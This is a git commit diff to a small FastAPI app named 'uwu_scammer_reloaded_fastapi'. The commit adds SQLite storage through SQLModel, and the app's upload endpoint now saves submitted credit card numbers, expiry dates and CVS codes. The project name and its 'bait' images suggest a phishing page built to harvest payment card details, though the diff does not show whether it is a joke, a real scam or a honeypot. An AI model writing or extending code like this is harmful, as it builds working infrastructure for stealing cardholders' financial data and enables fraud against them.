35edbfbaab90fce7827f6a92c2068a1b2a9501ad
JBDCE <61785226+JBDCE@users.noreply.github.com>
2025-11-21 23:40:34 +0100

    Add some readme hints and some very terrible database copypasta

--- uwu_scammer_reloaded_fastapi/main.py
+++ uwu_scammer_reloaded_fastapi/main.py
@@ -1,17 +1,32 @@
 from random import choice
+from typing import Annotated
 
-from fastapi import FastAPI, Request
+from fastapi import FastAPI, Request, Depends
 from fastapi.responses import HTMLResponse
 from fastapi.staticfiles import StaticFiles
 from fastapi.templating import Jinja2Templates
 
-from pydantic import BaseModel
+from sqlmodel import SQLModel, Field, Session, create_engine, select
 
-class CreditCard(BaseModel):
+
+class CreditCard(SQLModel, table=True):
+    id: int | None = Field(default=None, primary_key=True)
     card_num: str
     expiry_date: str
     cvs: int
 
+sqlite_url = f"sqlite:///database.db"
+connect_args = {"check_same_thread": False}
+engine = create_engine(sqlite_url, connect_args=connect_args)
+
+def create_db_and_tables():
+    SQLModel.metadata.create_all(engine)
+
+def get_session():
+    with Session(engine) as session:
+        yield session
+
+SessionDep = Annotated[Session, Depends(get_session)]
 app = FastAPI()
 app.mount(
     "/static",
@@ -25,7 +40,6 @@ bait_to_color = {
     'bait_img.png': '#81746f',
     'way_too_large.png': '#fec97b',
     'hoarse.png': '#d2c1f0',
-    'bo.png': '#ffffff',
     'pink.png': "#f3bfd9",
 }
 
@@ -44,7 +58,7 @@ async def main_page(request: Request):
 
 
 @app.post("/upload")
-async def upload_details(card_num, expiry, cvs):
+async def upload_details(card_num, expiry, cvs, session: SessionDep):
     # TODO Validate Client side inputs
     credit_card = CreditCard(
         card_num=card_num,
@@ -53,5 +67,13 @@ async def upload_details(card_num, expiry, cvs):
     )
     # TODO Write Result to Database
     print(credit_card)
+    CreditCard.model_validate(credit_card)
     # TODO Tell client about success maybe
+    session.add(credit_card)
+    session.commit()
     return
+
+@app.on_event("startup")
+def on_startup():
+    create_db_and_tables()
+
